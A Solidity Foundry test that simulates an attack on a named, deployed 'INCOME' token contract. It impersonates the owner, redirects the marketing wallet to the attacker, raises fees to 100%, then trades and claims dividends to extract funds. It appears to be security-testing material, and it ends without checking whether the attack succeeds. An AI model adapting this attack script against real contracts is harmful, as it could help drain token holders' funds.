pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

interface INCOME {
    function owner() external view returns (address);
    function setMarketingWallet(address payable _newMarketingWallet) external;
    function setFee(uint256 _bnbRewardFee, uint256 _liquidityFee, uint256 _marketingFee) external;
    function setExtraFeeOnSell(uint256 _extraFeeOnSell) external;
    function setExcludeFromAll(address _address) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function uniswapV2Router() external view returns (address);
    function uniswapV2Pair() external view returns (address);
    function claim() external;
    function processDividendTracker(uint256 gas) external;
    function openTrade() external; // Added missing function
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x3a91A88Ef4bB813BB99EF5a745bcb56e3A3b403b;
    address attacker = address(this);
    uint256 initialBalance;
    uint256 finalBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // We need to get the owner address first
        address owner = INCOME(TARGET).owner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "INCOME Token");
        vm.label(INCOME(TARGET).uniswapV2Pair(), "Uniswap Pair");

        // Store initial balance for oracle check
        initialBalance = address(this).balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get owner address and verify
        address owner = INCOME(TARGET).owner();
        require(owner != address(0), "Owner is zero address");

        // Step 2: Start impersonating owner
        vm.startPrank(owner);

        // Step 3: Open trading to bypass LockToken restrictions
        INCOME(TARGET).openTrade();

        // Step 4: Set marketing wallet to attacker
        INCOME(TARGET).setMarketingWallet(payable(address(this)));

        // Step 5: Set extremely high fees: BNBRewardsFee=95, liquidityFee=0, marketingFee=5 (total 100%)
        INCOME(TARGET).setFee(95, 0, 5);

        // Step 6: Also set extraFeeOnSell to 0 to avoid extra complexity
        INCOME(TARGET).setExtraFeeOnSell(0);

        // Step 7: Ensure we're excluded from max tx limit and fees
        INCOME(TARGET).setExcludeFromAll(address(this));

        // Step 8: Stop prank
        vm.stopPrank();

        // Step 9: Give attacker some BNB to buy tokens
        deal(address(this), 100 ether);

        // Step 10: Get router and pair addresses
        IUniswapV2Router02 router = IUniswapV2Router02(INCOME(TARGET).uniswapV2Router());
        address pair = INCOME(TARGET).uniswapV2Pair();

        // Step 11: Approve router to spend our BNB
        // Not needed for swapExactETHForTokensSupportingFeeOnTransferTokens

        // Step 12: Buy some INCOME tokens
        address[] memory buyPath = new address[](2);
        buyPath[0] = router.WETH();
        buyPath[1] = TARGET;

        // Buy tokens with 10 BNB
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 10 ether}(
            0, // Accept any amount of tokens
            buyPath,
            address(this),
            block.timestamp
        );

        // Step 13: Approve router to spend our INCOME tokens
        INCOME(TARGET).approve(address(router), type(uint256).max);

        // Step 14: Sell tokens to trigger fee collection
        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = router.WETH();

        uint256 tokenBalance = INCOME(TARGET).balanceOf(address(this));

        // Sell all tokens
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance,
            0, // Accept any amount of ETH
            sellPath,
            address(this),
            block.timestamp
        );

        // Step 15: Claim dividends from dividend tracker
        INCOME(TARGET).claim();

        // Step 16: Also try to process dividend tracker to ensure all dividends are distributed
        INCOME(TARGET).processDividendTracker(500000);

        // Step 17: Check final balance
        finalBalance = address(this).balance;
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

